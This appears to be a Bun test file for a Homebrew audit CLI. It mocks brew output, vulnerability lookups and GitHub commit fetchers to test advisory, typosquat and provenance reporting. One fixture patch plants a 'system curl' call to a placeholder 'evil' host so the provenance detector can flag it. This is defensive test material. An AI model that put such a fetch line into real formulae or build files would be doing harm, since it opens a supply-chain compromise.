import { afterEach, beforeEach, describe, expect, mock, spyOn, test } from "bun:test"
import { handleAudit } from "@cli/audit"
import { handleStatus } from "@cli/status"
import { resetDb } from "@db"

type FakeChild = { stdout: string; stderr: string; exitCode: number; exited: Promise<void>; kill: () => void }
function fakeChild(stdout = "", stderr = "", exitCode = 0): FakeChild {
  return { stdout, stderr, exitCode, exited: Promise.resolve(), kill: () => {} }
}
function fakeResponse(body: unknown, init: { ok?: boolean; status?: number } = {}): Response {
  const ok = init.ok ?? true
  return {
    ok,
    status: init.status ?? (ok ? 200 : 500),
    headers: new Headers(),
    text: async () => (typeof body === "string" ? body : JSON.stringify(body)),
    json: async () => (typeof body === "string" ? JSON.parse(body) : body),
  } as Response
}

let spawnSpy: ReturnType<typeof spyOn> | null = null
let logSpy: ReturnType<typeof spyOn> | null = null
let warnSpy: ReturnType<typeof spyOn> | null = null
const realFetch = globalThis.fetch
const realBunFile = Bun.file
let logs: string[] = []

beforeEach(() => {
  resetDb()
  delete process.env.GITHUB_TOKEN
  delete process.env.GH_TOKEN
  logs = []
  logSpy = spyOn(console, "log").mockImplementation(((msg: string) => {
    logs.push(String(msg))
  }) as never)
  warnSpy = spyOn(console, "warn").mockImplementation((() => {}) as never)
})

afterEach(() => {
  spawnSpy?.mockRestore()
  spawnSpy = null
  logSpy?.mockRestore()
  warnSpy?.mockRestore()
  globalThis.fetch = realFetch
  Bun.file = realBunFile
})

function stubAll(
  opts: {
    formula?: { name: string; version: string }
    outdated?: boolean
    vulns?: Array<{
      id: string
      cvss?: number
      summary?: string
      fixedIn?: string | null
      kind?: "vulnerability" | "typosquat"
    }>
  } = {},
) {
  const formula = opts.formula ?? { name: "gcc", version: "13.0" }
  spawnSpy = spyOn(Bun, "spawn").mockImplementation(((args: string[]) => {
    if (args[1] === "--prefix") return fakeChild("/opt/homebrew\n")
    if (args[1] === "list" && args[2] === "--formula") return fakeChild(`${formula.name} ${formula.version}\n`)
    if (args[1] === "list" && args[2] === "--cask") return fakeChild("")
    if (args[1] === "leaves") return fakeChild(`${formula.name}\n`)
    if (args[1] === "outdated") {
      if (opts.outdated) {
        return fakeChild(
          JSON.stringify({
            formulae: [
              {
                name: formula.name,
                installed_versions: [formula.version],
                current_version: "14.1.0",
                pinned: false,
                pinned_version: null,
              },
            ],
            casks: [],
          }),
        )
      }
      return fakeChild('{"formulae":[],"casks":[]}')
    }
    if (args[1] === "info") {
      return fakeChild(
        JSON.stringify({
          formulae: [
            {
              name: formula.name,
              full_name: formula.name,
              tap: "homebrew/core",
              desc: "x",
              homepage: null,
              versions: { stable: "14.1.0", head: null },
              pinned: false,
              outdated: !!opts.outdated,
              installed: [],
            },
          ],
          casks: [],
        }),
      )
    }
    return fakeChild("")
  }) as never)
  // @ts-expect-error — patch Bun.file for install-receipt reads
  Bun.file = (_path: string) => ({
    json: async () => ({
      time: 1_600_000_000,
      source_modified_time: 1_600_000_000,
      installed_as_dependency: false,
      installed_on_request: true,
      built_as_bottle: true,
      poured_from_bottle: true,
      source: { tap: "homebrew/core", versions: { stable: formula.version, head: null } },
    }),
  })

  const vulns = (opts.vulns ?? []).map((v) => ({
    id: v.id,
    aliases: v.id.startsWith("CVE-") ? [v.id] : [],
    summary: v.summary ?? "",
    severity: v.cvss !== undefined ? [{ type: "CVSS_V3", score: String(v.cvss) }] : [],
    affected:
      v.kind === "typosquat"
        ? [{ package: { name: formula.name, ecosystem: "npm" } }]
        : [
            {
              package: { name: formula.name, ecosystem: "Homebrew" },
              ranges: [
                { type: "ECOSYSTEM", events: [{ introduced: "0" }, ...(v.fixedIn ? [{ fixed: v.fixedIn }] : [])] },
              ],
            },
          ],
    references: [],
  }))

  globalThis.fetch = mock(async (url: string) => {
    if (url.includes("querybatch")) return fakeResponse({ results: [{ vulns: vulns.map((v) => ({ id: v.id })) }] })
    if (url.includes("/vulns/")) {
      const id = url.split("/vulns/").pop()!
      return fakeResponse(vulns.find((v) => v.id === id) ?? null)
    }
    // GitHub commits API → empty (no GHSA token anyway)
    return fakeResponse([])
  }) as unknown as typeof fetch
}

describe("handleAudit", () => {
  test("returns 0 and prints 'no advisories' when none found", async () => {
    stubAll({ outdated: true })
    const exit = await handleAudit([])
    expect(exit).toBe(0)
    expect(logs.join("\n")).toMatch(/No advisories|No advisories found/)
  })

  test("--json emits parseable JSON array", async () => {
    stubAll({
      outdated: true,
      vulns: [{ id: "CVE-2024-0001", cvss: 9.8, summary: "RCE", fixedIn: "14.1.0" }],
    })
    const exit = await handleAudit(["--json"])
    expect(exit).toBe(0)
    const json = logs.join("\n")
    const parsed = JSON.parse(json)
    expect(Array.isArray(parsed)).toBe(true)
    expect(parsed[0]!.advisory.id).toBe("CVE-2024-0001")
    expect(parsed[0]!.name).toBe("gcc")
  })

  test("text output groups by severity and surfaces CVE id", async () => {
    stubAll({
      outdated: true,
      vulns: [
        { id: "CVE-2024-0001", cvss: 9.8, summary: "RCE", fixedIn: "14.1.0" },
        { id: "CVE-2024-0002", cvss: 5.0, summary: "DoS", fixedIn: "14.1.0" },
      ],
    })
    const exit = await handleAudit([])
    expect(exit).toBe(0)
    const out = logs.join("\n")
    expect(out).toContain("CVE-2024-0001")
    expect(out).toContain("CVE-2024-0002")
    expect(out).toMatch(/CRITICAL/)
    expect(out).toMatch(/MEDIUM/)
  })

  test("renders all severity bands (critical/high/medium/low) when present", async () => {
    stubAll({
      outdated: true,
      vulns: [
        { id: "CVE-2024-C", cvss: 9.5, summary: "crit", fixedIn: "14.1.0" },
        { id: "CVE-2024-H", cvss: 7.5, summary: "high", fixedIn: "14.1.0" },
        { id: "CVE-2024-M", cvss: 5.0, summary: "med", fixedIn: "14.1.0" },
        { id: "CVE-2024-L", cvss: 1.5, summary: "low", fixedIn: "14.1.0" },
      ],
    })
    const exit = await handleAudit([])
    expect(exit).toBe(0)
    const out = logs.join("\n")
    expect(out).toMatch(/CRITICAL/)
    expect(out).toMatch(/HIGH/)
    expect(out).toMatch(/MEDIUM/)
    expect(out).toMatch(/LOW/)
  })

  test("text output renders typosquats section when present", async () => {
    stubAll({
      outdated: true,
      vulns: [{ id: "MAL-2024-1", kind: "typosquat", summary: "suspicious npm twin" }],
    })
    const exit = await handleAudit([])
    expect(exit).toBe(0)
    expect(logs.join("\n")).toMatch(/TYPOSQUATS/)
  })

  test("text output renders PROVENANCE FLAGS section when present", async () => {
    process.env.GITHUB_TOKEN = "test-token"
    const { setProvenanceDetailFetcher, setProvenanceListFetcher } = await import("@brew/provenance")
    const { recordAuthors } = await import("@db")
    // Seed known-authors so the first run's new-maintainer guard doesn't suppress.
    recordAuthors("gcc", ["BrewTestBot"])
    setProvenanceListFetcher(async () => [
      {
        sha: "deadbee",
        html_url: "https://github.com/Homebrew/homebrew-core/commit/deadbee",
        author: { login: "BrewTestBot" },
      },
    ])
    setProvenanceDetailFetcher(async (_repo, sha) => ({
      sha,
      author: { login: "BrewTestBot" },
      files: [
        {
          filename: "Formula/g/gcc.rb",
          patch: '@@ -1 +1,2 @@\n+    system "curl", "-fsSL", "http://evil/x"',
        },
      ],
    }))

    stubAll({ outdated: true, vulns: [{ id: "CVE-2024-0001", cvss: 8.0, fixedIn: "14.0.5" }] })
    const exit = await handleAudit([])
    expect(exit).toBe(0)
    expect(logs.join("\n")).toMatch(/PROVENANCE FLAGS/)
    expect(logs.join("\n")).toMatch(/system-call/)
  })
})

describe("handleStatus", () => {
  test("prints up-to-date when nothing is outdated", async () => {
    stubAll({ outdated: false })
    const exit = await handleStatus()
    expect(exit).toBe(0)
    expect(logs.join("\n")).toMatch(/up-to-date/i)
  })

  test("prints each outdated package with version arrow", async () => {
    stubAll({ outdated: true })
    const exit = await handleStatus()
    expect(exit).toBe(0)
    const out = logs.join("\n")
    expect(out).toContain("gcc")
    expect(out).toContain("14.1.0")
  })
})
